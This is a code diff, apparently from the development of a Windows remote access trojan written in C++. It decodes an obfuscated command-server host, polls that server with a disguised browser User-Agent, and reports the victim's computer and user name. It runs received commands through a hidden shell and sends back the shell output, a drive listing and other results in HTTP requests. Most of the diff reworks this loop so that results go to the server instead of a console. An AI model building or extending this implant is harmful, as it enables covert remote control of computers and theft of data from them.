@@ -25,7 +25,7 @@ using namespace std;
 #define COMMMAND_BUFFER (8192)
 
 
-int http_get(char *host, char *uri, char *headers, char **data)
+int http_get(char *host, char *uri, char *headers, char *optional, int optional_length, char **data)
 {
 
 	HINTERNET hSession = InternetOpen(
@@ -56,11 +56,16 @@ int http_get(char *host, char *uri, char *headers, char **data)
 		0);
 
 
-	HttpAddRequestHeaders(hHttpFile, headers, -1, HTTP_ADDREQ_FLAG_ADD);
+//	HttpAddRequestHeaders(hHttpFile, headers, -1, HTTP_ADDREQ_FLAG_ADD);
+	int error = 0;
 
-
-	while (!HttpSendRequest(hHttpFile, NULL, 0, 0, 0)) {
-		printf("HttpSendRequest error : (%lu)\n", GetLastError());
+	while (!HttpSendRequest(hHttpFile, headers, strlen(headers), optional, optional_length))
+	{
+		if (error == 0)
+		{
+			printf("HttpSendRequest error : (%lu)\n", GetLastError());
+			error = 1;
+		}
 
 		InternetErrorDlg(
 			GetDesktopWindow(),
@@ -93,8 +98,10 @@ int http_get(char *host, char *uri, char *headers, char **data)
 	dwFileSize = (DWORD)atol(bufQuery);
 //	dwFileSize = BUFSIZ;
 
-	char* buffer;
+	char *buffer;
 	buffer = new char[dwFileSize + 1];
+
+	memset(buffer, 0, dwFileSize + 1);
 
 	while (true)
 	{
@@ -167,7 +174,7 @@ int http_put(char *host, char *uri, char *headers, char *data, int length)
 	HttpAddRequestHeaders(hHttpFile, headers, -1, HTTP_ADDREQ_FLAG_ADD);
 
 
-	while (!HttpSendRequest(hHttpFile, NULL, 0, 0, 0)) {
+	while (!HttpSendRequest(hHttpFile, NULL, 0, "hello", 5)) {
 		printf("HttpSendRequest error : (%lu)\n", GetLastError());
 
 		InternetErrorDlg(
@@ -314,7 +321,7 @@ int HttpUploadFile(char *data, int length, char *host, char *uri)
 		return -1;
 	}
 
-	HINTERNET hConnect = InternetConnect(hInternet, host, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	HINTERNET hConnect = InternetConnect(hInternet, host, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	if (hConnect == NULL)
 	{
 		printf("InternetConnect Error\n");
@@ -505,7 +512,7 @@ void RedirectIOToConsole(int debug)
 		AllocConsole();
 		HWND hwndConsole = GetConsoleWindow();
 
-		ShowWindow(hwndConsole, SW_MAXIMIZE);
+		//ShowWindow(hwndConsole, SW_MAXIMIZE);
 		// set the screen buffer to be big enough to let us scroll text
 		GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &coninfo);
 
@@ -1679,9 +1686,10 @@ int stop_process_or_service(BOOL process, char *cmdline, int pid)
 
 
 
-int list_volumes()
+int list_volumes(char *response)
 {
 	// May use 2-D array for char. This program compiled for wide char/unicode
+	char output[8192] = { 0 };
 
 	LPCSTR drive[26] = {
 		"A:\\",
@@ -1722,27 +1730,35 @@ int list_volumes()
 		switch (type)
 		{
 		case 0:
-			printf("Drive %s is type %d - Unknown\n", drive[i], type);
+			sprintf(output, "Drive %s is type %d - Unknown\n", drive[i], type);
+			strcat(response, output);
 			break;
 		case 1:
 			//printf("Drive %s is type %d - Invalid root path/Not available.\n", drive2[i], type);
 			break;
 		case 2:
-			printf("Drive %s is type %d - Removable\n", drive[i], type);
+			sprintf(output, "Drive %s is type %d - Removable\n", drive[i], type);
+			strcat(response, output);
 			break;
 		case 3:
-			printf("Drive %s is type %d - Fixed\n", drive[i], type);
+			sprintf(output, "Drive %s is type %d - Fixed\n", drive[i], type);
+			strcat(response, output);
 			break;
 		case 4:
-			printf("Drive %s is type %d - Network\n", drive[i], type);
+			sprintf(output, "Drive %s is type %d - Network\n", drive[i], type);
+			strcat(response, output);
 			break;
 		case 5:
-			printf("Drive %s is type %d - CD-ROM\n", drive[i], type);
+			sprintf(output, "Drive %s is type %d - CD-ROM\n", drive[i], type);
+			strcat(response, output);
 			break;
 		case 6:
-			printf("Drive %s is type %d - RAMDISK\n", drive[i], type);
+			sprintf(output, "Drive %s is type %d - RAMDISK\n", drive[i], type);
+			strcat(response, output);
 			break;
-		default: "Unknown value!\n";
+		default:
+			sprintf(output, "Unknown value!\n");
+			strcat(response, output);
 		}
 
 		if (type > 1)
@@ -1767,13 +1783,16 @@ int list_volumes()
 			{
 				DWORD err = GetLastError();
 
-				printf("GetVolumeInformation failed %d\n", err);
+				sprintf(output, "GetVolumeInformation failed %d\n", err);
+				strcat(response, output);
 
 			}
 			else
 			{
-				printf("\tVolume name: %s\n", wszVolumeName);
-				printf("\tFile system type: %s\n", wszSystemName);
+				sprintf(output, "\tVolume name: %s\n", wszVolumeName);
+				strcat(response, output);
+				sprintf(output, "\tFile system type: %s\n", wszSystemName);
+				strcat(response, output);
 			}
 
 		}
@@ -1872,7 +1891,7 @@ int parse_command(char *cmdline, int &cmd, int &process, int &pid, char *host, c
 RedirectProcessIO shell_process;
 
 
-int process_command(char *cmdline, char *headers)
+int process_command(char *cmdline, char *headers, char *response)
 {
 	int cmd = -1;
 	int process = -1;
@@ -1899,32 +1918,37 @@ int process_command(char *cmdline, char *headers)
 
 		memset(shell_buffer, 0, shell_length);
 		ret = shell_process.read(shell_buffer, shell_length);
+
+		strcat(response, shell_buffer);
 		printf("%s", shell_buffer);
 
+		strcat(cmdline, "\n");
 		ret = shell_process.write(cmdline);
 		if (ret != 0)
 		{
 			shell_mode = 0;
 			// try the command again just in case it wasn't targeted to the shell
-			process_command(cmdline, headers);
+			process_command(cmdline, headers, response);
 			return 0;
 		}
 
 		memset(shell_buffer, 0, shell_length);
 		ret = shell_process.read(shell_buffer, shell_length);
+		strcat(response, shell_buffer);
 		printf("%s", shell_buffer);
 
 		if (ret != 0)
 		{
 			shell_mode = 0;
 			// try the command again just in case it wasn't targeted to the shell
-			process_command(cmdline, headers);
+			process_command(cmdline, headers, response);
 			return 0;
 		}
 
 		// read one last time to check for broken pipes
 		memset(shell_buffer, 0, shell_length);
 		ret = shell_process.read(shell_buffer, shell_length);
+		strcat(response, shell_buffer);
 		printf("%s", shell_buffer);
 
 		if (ret != 0)
@@ -1947,13 +1971,10 @@ int process_command(char *cmdline, char *headers)
 	{
 	case 0:
 		start_shell(&shell_process);
-
-		// let the shell start up
-		Sleep(5);
-		memset(shell_buffer, 0, shell_length);
-		ret = shell_process.read(shell_buffer, shell_length);
-		printf("%s", shell_buffer);
-
+		if (ret == 0)
+		{
+			strcat(response, "Shell started\n");
+		}
 		shell_mode = 1;
 		break;
 	case 1:
@@ -1966,7 +1987,7 @@ int process_command(char *cmdline, char *headers)
 	{
 		char *data = NULL;
 
-		http_get(host, uri, headers, &data);
+		http_get(host, uri, headers, "", 0, &data);
 		break;
 	}
 	case 4:
@@ -2001,7 +2022,7 @@ int process_command(char *cmdline, char *headers)
 		break;
 	}
 	case 11:
-		list_volumes();
+		list_volumes(response);
 		break;
 	case 12:
 		break;
@@ -2115,6 +2136,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmd
 	char uri[4096] = { 0 };
 	int exit = 0;
 
+	char request[4 * 4096] = { 0 };
+	char response[4 * 4096] = { 0 };
+
 	char *data = NULL;
 
 
@@ -2122,66 +2146,31 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmd
 	RedirectIOToConsole(1);
 
 	whoami(user, comp);
-	sprintf(headers, "User-Agent: Mozilla/5.0\r\nAccept:*/*\r\nPragma:no-cache\r\nComputer: %s\r\n", comp);
+	sprintf(headers, "User-Agent: Mozilla/5.0\r\nAccept:*/*\r\nPragma:no-cache\r\n\r\n\r\n");
 
 
 	decode(host_encoded, 19, host);
 	decode(uri_encoded, 13, uri);
+
+	strcpy(host, "127.0.0.1");
+	strcpy(uri, "index.html");
+
+	sprintf(response, "%s/%s Connected!\n", comp, user);
+
 
 	while (1)
 	{
 		char cmdline[128][4096] = { 0 };
 		int num_cmd = 0;
 
-		http_get(host, uri, headers, &data);
+		http_get(host, uri, headers, response, strlen(response), &data);
+		printf("\nExecuting command: %s\n", data);
 
-		if (strstr(data, "rat") != 0)
+		memset(response, 0, sizeof(response));
+		strcat(response, "\n"); // python likes having some data
+		if (process_command(data, headers, response) == -1)
 		{
-			char *pdata = strstr(data, "rat");
-
-			while (1)
-			{
-				pdata = strstr(pdata, "\n");
-				if (pdata != NULL)
-				{
-					char *pdata_end = strstr(pdata + 1, "\n");
-					if (pdata_end == NULL)
-					{
-						break;
-					}
-
-					memcpy(cmdline[num_cmd++], pdata, pdata_end - pdata);
-					pdata += 2;
-
-					trim_characters(cmdline[num_cmd - 1], strlen(cmdline[num_cmd - 1]), "\r\n\t", 3);
-					strcat(cmdline[num_cmd - 1], "\n");
-
-					if (strstr(cmdline[num_cmd - 1], "</div>") != 0)
-					{
-						num_cmd--;
-						// reached ending div of container
-						break;
-					}
-
-
-				}
-				else
-				{
-					break;
-				}
-
-
-			}
-
-		}
-
-		for (int i = 0; i < num_cmd; i++)
-		{
-			printf("\nExecuting command [%d] %s\n", i, cmdline[i]);
-			if (process_command(cmdline[i], headers) == -1)
-			{
-				exit = 1;
-			}
+			exit = 1;
 		}
 
 		if (exit)
